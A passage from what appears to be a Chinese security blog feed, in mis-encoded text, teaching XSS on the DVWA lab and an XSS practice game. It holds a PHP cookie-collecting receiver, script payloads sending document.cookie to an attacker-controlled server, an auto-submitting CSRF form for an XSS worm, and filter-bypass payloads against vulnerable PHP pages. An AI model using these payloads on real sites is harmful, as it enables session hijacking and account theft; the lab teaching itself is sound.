        <content type="html"><![CDATA[<h2 id="xssç›—å–cookie"><a href="#xssç›—å–cookie" class="headerlink" title="xssç›—å–cookie"></a>xssç›—å–cookie</h2><h3 id="ä»€ä¹ˆæ˜¯cookie"><a href="#ä»€ä¹ˆæ˜¯cookie" class="headerlink" title="ä»€ä¹ˆæ˜¯cookie"></a>ä»€ä¹ˆæ˜¯cookie</h3><p>cookieæ˜¯æ›²å¥‡é¥¼ï¼Œå•Šå¼€ä¸ªç©ç¬‘ï¼Œcookieæ˜¯æ¯ä¸ªç”¨æˆ·ç™»å½•å”¯ä¸€idå’Œè´¦å·å¯†ç ä¸€æ ·å¯ä»¥ç™»å½•åˆ°ç½‘ç«™ï¼Œæ˜¯çš„ä½ æ²¡æœ‰å¬é”™cookieå¯ä»¥ç›´æ¥ç™»å½•ï¼Œè‡³äºæœåŠ¡å™¨æ€ä¹ˆè®¾ç½®cookie<br>å’Œcookieå­˜å‚¨è¿™é‡Œå°±ä¸è¯´äº†ï¼Œéœ€çš„è¦è‡ªè¡Œç™¾åº¦</p><h3 id="xssç›—å–cookie-dvwaæ¼”ç¤º"><a href="#xssç›—å–cookie-dvwaæ¼”ç¤º" class="headerlink" title="xssç›—å–cookie(dvwaæ¼”ç¤º)"></a>xssç›—å–cookie(dvwaæ¼”ç¤º)</h3><p>å­¦ä¹ xssæ—¶è§‰å¾—å•Šè¿™ï¼Œä¸å°±æ˜¯ä¸€ä¸ªå¼¹çª—å—ï¼Œæœ‰å•¥ç”¨ï¼Œç»è¿‡å­¦ä¹ åå‘ç°xssçš„å±å®³è¿˜æ˜¯æŒºå¤§çš„ï¼Œå¼¹çª—çš„ç›®çš„åªæ˜¯è¯´æ˜è¿™é‡Œå¯ä»¥æ‰§è¡ŒåŠ¨æ€è„šæœ¬ï¼Œé‚£å°±å¯ä»¥å¹²å¾ˆå¤šäº‹æƒ…äº†</p><h4 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h4><p>å®˜ç½‘:<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br>ä¸‹è½½åœ°å€:<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>ä¸‹è½½æ–¹å¼:zipä¸‹è½½æˆ–git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>ä¸‹è½½å®Œæˆæ”¾å…¥httpæœåŠ¡ä¸‹å³å¯<br>æˆ‘ä½¿ç”¨çš„æ˜¯phpstudyä¸‹è½½åœ°å€:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h4 id="è®¾ç½®æ¥å—ç›—å–cookieæ–¹å¼"><a href="#è®¾ç½®æ¥å—ç›—å–cookieæ–¹å¼" class="headerlink" title="è®¾ç½®æ¥å—ç›—å–cookieæ–¹å¼"></a>è®¾ç½®æ¥å—ç›—å–cookieæ–¹å¼</h4><p>xssç›—å–çš„cookieè‚¯å®šæ˜¯è¦ä¿å­˜åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªæ¥å—cookieçš„phpç½‘é¡µä»£ç æ¥å—åˆ°è¯·æ±‚æºå¸¦cookieåä¿å­˜åˆ°æ–‡ä»¶æˆ–è€…æ•°æ®åº“ä¸­ç­‰éƒ½å¯ä»¥ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä¸è®¾ç½®å­˜å‚¨ï¼Œéšä¾¿è¯·æ±‚ä¸€ä¸ªä¸€ä¸ªæœåŠ¡å™¨ç½‘é¡µå­˜åœ¨ä¸å­˜åœ¨æ— æ‰€è°“ï¼Œå› ä¸ºè¯·æ±‚å¯ä»¥ä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ï¼Œä½†æ˜¯çœ‹èµ·æ¥å¯èƒ½ä¸æ–¹ä¾¿è€Œå·²ï¼Œä¸‹é¢æ˜¯ä¿å­˜cookieçš„phpä»£ç </p><pre><code>&lt;?phpif(isset($_GET[&#39;cookie&#39;]))                 //å¦‚æœæ¥æ”¶åˆ°cookie{    $file = fopen(&#39;./cookie.txt&#39;, &#39;a&#39;);    //æ‰“å¼€å­˜å‚¨çš„æ–‡ä»¶    fwrite($file, $_GET[&#39;cookie&#39;].&quot;\r\n&quot;); //å°†è·å–çš„cookieå­˜å‚¨    fclose($file);                         //å…³é—­æ–‡ä»¶}</code></pre><h4 id="æ”¾ç½®xss-è¿™é‡Œç”¨å­˜å‚¨å‹xssæµ‹è¯•"><a href="#æ”¾ç½®xss-è¿™é‡Œç”¨å­˜å‚¨å‹xssæµ‹è¯•" class="headerlink" title="æ”¾ç½®xss(è¿™é‡Œç”¨å­˜å‚¨å‹xssæµ‹è¯•)"></a>æ”¾ç½®xss(è¿™é‡Œç”¨å­˜å‚¨å‹xssæµ‹è¯•)</h4><pre><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p>æˆ‘è¿™é‡Œç”¨çš„æœ¬åœ°çš„æµ‹è¯•ï¼Œdocument.cookieï¼Œå°±æ˜¯è·å–cookieï¼Œç„¶åæºå¸¦cookieè®¿é—®<a href="http://127.0.0.1/cookies/cookies.php?ï¼ˆæ¢æˆè‡ªå·±æœåŠ¡å™¨ipå°±å¯ä»¥äº†ï¼Œè¿™é‡Œæˆ‘æœ¬åœ°æµ‹è¯•ï¼‰ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„cookie" target="_blank" rel="noopener">http://127.0.0.1/cookies/cookies.php?ï¼ˆæ¢æˆè‡ªå·±æœåŠ¡å™¨ipå°±å¯ä»¥äº†ï¼Œè¿™é‡Œæˆ‘æœ¬åœ°æµ‹è¯•ï¼‰ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„cookie</a><br><img src="https://Lmg66.github.io/img/139.png" alt="å›¾ç‰‡"></p><p>ç„¶åç‚¹å‡»æˆ‘ä»¬æ”¾å­˜å‚¨å‹xssçš„åœ°æ–¹ï¼ˆxss(stored)ï¼‰,å‘ç°è·³è½¬åˆ°äº†ä»¤ä¸€ä¸ªç½‘ç«™ï¼Œå¹¶ä¸”æºå¸¦äº†ä½ çš„cookie</p><p><img src="https://Lmg66.github.io/img/140.png" alt="å›¾ç‰‡"></p><p>åœ¨åˆ°cookie.phpç›®å½•æŸ¥çœ‹cookie.txtï¼Œå¯ä»¥å‘ç°cookieå·²ç»è¢«å­˜å‚¨ï¼Œcookieè¢«ç›—å–ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨cookieè¿›è¡Œç™»å½•<br><img src="https://Lmg66.github.io/img/141.png" alt="å›¾ç‰‡"><br>è¿™ç§åŠ¨é™å¯èƒ½æœ‰ç‚¹å¤§ï¼Œå¯ä»¥ç”¨jsåŠ è½½å›¾ç‰‡çš„æ–¹å¼æ¥å‘é€å¸¦æœ‰cookieçš„è¯·æ±‚ï¼Œ</p><pre><code>&lt;script&gt;new Image().src = &#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p><a href="https://www.cnblogs.com/yangzhou33/p/9215937.html" target="_blank" rel="noopener">ä½¿ç”¨new Image()è¿›è¡Œé¢„åŠ è½½</a><br><img src="https://Lmg66.github.io/img/142.png" alt="å›¾ç‰‡"><br>å½“ç„¶å¦‚æœä½ è¿˜æœ‰å…¶åŠ¨é™å°çš„æ–¹æ³•å¯ä»¥ç•™è¨€ï¼Œå½“ç„¶è¿˜å¯ä»¥ç”¨æ¥åŠ è½½å…¶ä»–çš„xssç¥å™¨jsä»£ç </p><pre><code>&lt;script src=&#39;&#39;&gt;</code></pre><h2 id="xssè •è™«"><a href="#xssè •è™«" class="headerlink" title="xssè •è™«"></a>xssè •è™«</h2><h3 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h3><p>æœ‰å­˜å‚¨å‹xssï¼Œå¯ä»¥csrf</p><h3 id="åŸç†ï¼ˆä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯å¯ä»¥è¯„è®ºè”ç³»æˆ‘ï¼‰"><a href="#åŸç†ï¼ˆä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯å¯ä»¥è¯„è®ºè”ç³»æˆ‘ï¼‰" class="headerlink" title="åŸç†ï¼ˆä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯å¯ä»¥è¯„è®ºè”ç³»æˆ‘ï¼‰"></a>åŸç†ï¼ˆä¸ªäººç†è§£ï¼Œå¦‚æœ‰é”™è¯¯å¯ä»¥è¯„è®ºè”ç³»æˆ‘ï¼‰</h3><p><img src="https://Lmg66.github.io/img/143.png" alt="å›¾ç‰‡"></p><h3 id="ç›¸å…³ä»£ç ï¼ˆåªæ˜¯ç®€å•çš„ï¼Œæœ‰è¿‡æ»¤ï¼Œè¦è€ƒè™‘ç»•è¿‡ï¼‰"><a href="#ç›¸å…³ä»£ç ï¼ˆåªæ˜¯ç®€å•çš„ï¼Œæœ‰è¿‡æ»¤ï¼Œè¦è€ƒè™‘ç»•è¿‡ï¼‰" class="headerlink" title="ç›¸å…³ä»£ç ï¼ˆåªæ˜¯ç®€å•çš„ï¼Œæœ‰è¿‡æ»¤ï¼Œè¦è€ƒè™‘ç»•è¿‡ï¼‰"></a>ç›¸å…³ä»£ç ï¼ˆåªæ˜¯ç®€å•çš„ï¼Œæœ‰è¿‡æ»¤ï¼Œè¦è€ƒè™‘ç»•è¿‡ï¼‰</h3><p>ä¸»ä½“å­˜å‚¨xss</p><pre><code>&lt;script&gt;document.location=&#39;csrfåœ°å€&#39;;&lt;/script&gt;</code></pre><p>csrfç”Ÿæˆ<br>ç”¨burpsuiteæŠ“åŒ…ï¼Œå³é”®ï¼Œå¦‚å›¾é€‰æ‹©ï¼Œcopyå¤åˆ¶ï¼Œç„¶åæ”¾åˆ°è‡ªå·±æœåŠ¡å™¨ç­‰ç­‰ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™csrfçš„pocï¼Œä½¿ä¹‹åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œå¯ä»¥è‡ªå·±ç‚¹å‡»ç­‰ç­‰ï¼Œè¿˜æœ‰ä¸€äº›ç»•è¿‡ç­‰ç­‰ï¼Œè¿™åªæ˜¯ç®€å•çš„csrfçš„poc<br><img src="https://Lmg66.github.io/img/144.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/145.png" alt="å›¾ç‰‡"><br>csrfæ¼”ç¤ºä»£ç ï¼ŒæŠ“å–çš„dvwaåŒ…åŠ äº†jsè‡ªåŠ¨ç‚¹å‡»</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://127.0.0.1/lmg/vulnerabilities/xss_s/index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;txtName&quot; value=&quot;Ã¦Âµ&amp;#139;Ã¨&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;mtxMessage&quot; value=&quot;Ã¦Âµ&amp;#139;Ã¨&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;btnSign&quot; value=&quot;Sign&amp;#32;Guestbook&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;script type=&quot;text/javascript&quot;&gt;                          // jsè‡ªåŠ¨ç‚¹å‡»      var form = document.getElementsByTagName(&#39;form&#39;)[0];      var input = document.getElementsByTagName(&#39;input&#39;)[3];      input.value = window.location.hash.substr(1);      form.submit();  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>å—å®³è€…å‚¨å­˜xsså’Œä¸»ä½“xssç±»ä¼¼åªæ˜¯è·³è½¬çš„ç½‘é¡µä¸åŒ</p><pre><code>&lt;script&gt;document.location=&#39;csrfåœ°å€&#39;;&lt;/script&gt;</code></pre><h3 id="ä¸ªäººæ€è€ƒ"><a href="#ä¸ªäººæ€è€ƒ" class="headerlink" title="ä¸ªäººæ€è€ƒ"></a>ä¸ªäººæ€è€ƒ</h3><p>xssçš„è •è™«åˆ©ç”¨èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒéš¾çš„ï¼Œè¦æœ‰å­˜å‚¨å‹xssï¼ˆè¿˜è¦å„ç§ç»•è¿‡ï¼‰ï¼Œå’Œcsrfï¼Œä½†æ˜¯å±å®³æ˜¯å¾ˆå¤§çš„ï¼Œä¸ä»…ä»…æ˜¯ä¼ æ’­æ–‡ç« ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªä¼ æ’­ç›—å–æ›´å¤šäººcookieï¼Œä¸ªäººä¿¡æ¯ï¼Œä½ç½®ï¼Œæµè§ˆå™¨ç‰ˆæœ¬å®‰è£…è½¯ä»¶ç­‰ç­‰</p><h2 id="xssåˆ©ç”¨çš„æ€è€ƒï¼ˆæŒç»­æ€è€ƒï¼‰"><a href="#xssåˆ©ç”¨çš„æ€è€ƒï¼ˆæŒç»­æ€è€ƒï¼‰" class="headerlink" title="xssåˆ©ç”¨çš„æ€è€ƒï¼ˆæŒç»­æ€è€ƒï¼‰"></a>xssåˆ©ç”¨çš„æ€è€ƒï¼ˆæŒç»­æ€è€ƒï¼‰</h2><p>åƒåå°„å‹xssï¼Œdomå‹çš„xssä¸åœ¨å±€é™äºç‚¹ä¸€ä¸ªå¾ˆé•¿çš„é“¾æ¥ï¼Œå¯ä»¥åˆ©ç”¨å…¶ä»–ç¬¬ä¸‰æ–¹ç½‘ç«™æ¥è·³è½¬ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨çŸ­é“¾æ¥ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨äºŒç»´ç ï¼ŒäºŒç»´ç æ†ç»‘ä¸€ä¸ªé“¾æ¥ï¼Œæ‰€ä»¥æ‰«ææœªçŸ¥äºŒç»´ç æ˜¯éå¸¸å±é™©çš„äº‹æƒ…<br>åƒå­˜å‚¨å‹xssï¼Œå¯ä»¥åˆ©ç”¨å‚¨å­˜å‹xsså¯¹å…¶ä»–ç½‘ç«™è¿›è¡Œæµé‡æ”»å‡»</p><h2 id="å‚è€ƒæ–‡ç« ä¸è¯´æ˜"><a href="#å‚è€ƒæ–‡ç« ä¸è¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« ä¸è¯´æ˜"></a>å‚è€ƒæ–‡ç« ä¸è¯´æ˜</h2><p><a href="https://www.freebuf.com/vuls/191274.html" target="_blank" rel="noopener">æŠ€æœ¯è®¨è®º | è®°ä¸€æ¬¡XSSè •è™«æ¸—é€å®éªŒ</a><br>è¯´æ˜ï¼šæœ¬æ–‡ä»…é™æŠ€æœ¯ç ”ç©¶ä¸è®¨è®ºï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™äº§ç”Ÿçš„ä¸€åˆ‡åæœè‡ªè¡Œæ‰¿æ‹…</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsså°æ¸¸æˆæºç åˆ†æ</title>
      <link href="/posts/996d.html"/>
      <url>/posts/996d.html</url>
      
        <content type="html"><![CDATA[<h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>ä¸‹è½½åœ°å€:<a href="https://files.cnblogs.com/files/Lmg66/xssgame-master.zip" target="_blank" rel="noopener">https://files.cnblogs.com/files/Lmg66/xssgame-master.zip</a><br>ä½¿ç”¨:ä¸‹è½½è§£å‹ï¼Œæ”¾åˆ°wwwç›®å½•ä¸‹(phpstudy)ï¼ŒhttpæœåŠ¡ä¸‹éƒ½è¡Œï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯phpstudy</p><h2 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><h3 id="æŸ¥çœ‹æºç "><a href="#æŸ¥çœ‹æºç " class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;);window.location.href=&quot;level2.php?keyword=è·¨ç«™å¸ˆ&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬1å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬1å…³ å…ˆçƒ­ä¸ªèº«å§&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·:&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/8deed969-b339-4c84-8654-b1a1e40e06de.png&quot; width=&quot;50%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>å¯¹nameæ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤è¾“å‡ºåˆ°æ ‡ç­¾ä¸­,åŸºæœ¬çš„xsséƒ½è¡Œ</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><h3 id="æŸ¥çœ‹æºç -1"><a href="#æŸ¥çœ‹æºç -1" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level3.php?writing=è‹¦å°½ç”˜æ¥&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬2å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬2å…³ çª’æ¯çš„æ“ä½œ&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/688da926-8a0b-452a-9a2b-82ba919328fb.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>ç”¨htmlspecialchars()å‡½æ•°ï¼Œä¹‹å‰åšè¿‡ï¼Œä¼šhtmlå®ä½“åŒ–ï¼Œ&lt;&gt;ä¼šè¢«è½¬ä¹‰<br>å¯ä»¥å°è¯•â€æ¥é—­åˆâ€</p><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><h3 id="æŸ¥çœ‹æºç -2"><a href="#æŸ¥çœ‹æºç -2" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level4.php?keyword=å®é™è‡´è¿œ&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬3å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬3å…³ è¿™è¯¥å’‹åŠå•Š&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/ee7a688a-d75e-4ed7-8a79-96e62d3127e2.png&quot; width=&quot;15%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>å’Œç¬¬äºŒå…³ç±»ä¼¼ï¼Œåªæ˜¯å˜æˆäº†å•å¼•å·ï¼Œé—­åˆå•å¼•å·å³å¯</p><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&#39; onclick=alert(&#39;xss&#39;) &#39;&#39; onclick=alert(&#39;xs&#39;) //</code></pre><h2 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h2><h3 id="æŸ¥çœ‹æºç -3"><a href="#æŸ¥çœ‹æºç -3" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level5.php?keyword=é€†æ°´è¡ŒèˆŸ&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬4å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬4å…³ ç”Ÿæ— å¯æ‹&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/0d3f0d24-a861-4d20-97da-f807ea842be8.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>åœ¨ç¬¬äºŒå…³çš„åŸºç¡€ä¸Šè¿›è¡Œäº†&lt; &gt;çš„è¿‡æ»¤ï¼Œä½†ç¬¬äºŒå…³payloadæ²¡æœ‰ &lt; &gt;ä»ç„¶å¯ä»¥ä½¿ç”¨</p><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; onclick=alert(&#39;XSS&#39;) //&quot; onclick=alert(&#39;XSS&#39;) &quot;</code></pre><h2 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h2><h3 id="æŸ¥çœ‹æºç -4"><a href="#æŸ¥çœ‹æºç -4" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level6.php?keyword=æŸ³æš—èŠ±æ˜&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬5å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬5å…³ æ²¡é”™åˆæ˜¯æœç´¢&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/cb30e912-eabc-4357-89eb-49e8de1b1961.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>strtolower()å‡½æ•°ï¼ŒæŠŠå­—ç¬¦è½¬æ¢ä¸ºå°å†™ï¼Œæ¥ç€æ›¿æ¢scriptæ ‡ç­¾å’Œonä½¿è¿™ä¸ªä¸¤ä¸ªäº‹ä»¶æ²¡æ³•ä½¿ç”¨ï¼Œä½†ä»å¯ä»¥é—­åˆå¼•å·ï¼Œæ‰€ä»¥è¦ä½¿ç”¨å…¶ä»–æ ‡ç­¾é€šè¿‡javascript:alert(â€˜xssâ€™)æ¥è§¦å‘å¼¹å‡º<br><img src="https://Lmg66.github.io/img/131.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/132.png" alt="å›¾ç‰‡"></p><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) &quot;&quot;&gt;&lt;a href=javascript:alert(&#39;xss&#39;) //</code></pre><h2 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h2><h3 id="æŸ¥çœ‹æºç -5"><a href="#æŸ¥çœ‹æºç -5" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level7.php?keyword=æŒä¹‹ä»¥æ’&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬6å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬6å…³ 